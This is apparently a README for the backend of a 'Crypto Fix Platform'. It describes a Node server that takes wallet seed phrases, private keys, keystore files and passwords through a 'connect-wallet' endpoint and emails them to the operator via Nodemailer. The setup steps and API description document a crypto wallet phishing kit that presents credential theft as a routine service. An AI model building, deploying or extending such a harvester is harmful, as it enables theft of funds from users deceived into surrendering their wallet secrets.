# Crypto Fix Platform Backend

This is the backend server for the Crypto Fix Platform that handles form submissions from wallet connections and sends the data via email using Nodemailer.

## Setup Instructions

### 1. Install Dependencies

```bash
npm install
```

### 2. Configure Environment Variables

Create a `.env` file in the root of the server directory and add the following:

```
EMAIL_USER=your-gmail@gmail.com
EMAIL_PASS=your-app-password
PORT=3001
```

Notes:
- For Gmail, you need to use an App Password. To generate one:
  1. Enable 2-Step Verification on your Google Account
  2. Go to Google Account > Security > App passwords
  3. Generate a new app password and use it in the `.env` file

### 3. Run the Server

Development mode:
```bash
npm run dev
```

Production mode:
```bash
npm start
```

## API Endpoints

### POST /api/connect-wallet

Accepts wallet connection data and sends it via email.

**Request Body:**
```json
{
  "walletType": "Metamask",
  "accessType": "Phrase",
  "selectedService": "Wallet Connect",
  "phrase": "your seed phrase...",
  "keystoreJson": "",
  "password": "",
  "privateKey": ""
}
```

**Response:**
```json
{
  "success": true,
  "message": "Wallet connection details sent successfully"
}
```

## Health Check

### GET /health

Returns the status of the server.

**Response:**
```json
{
  "status": "Server is running"
}
```
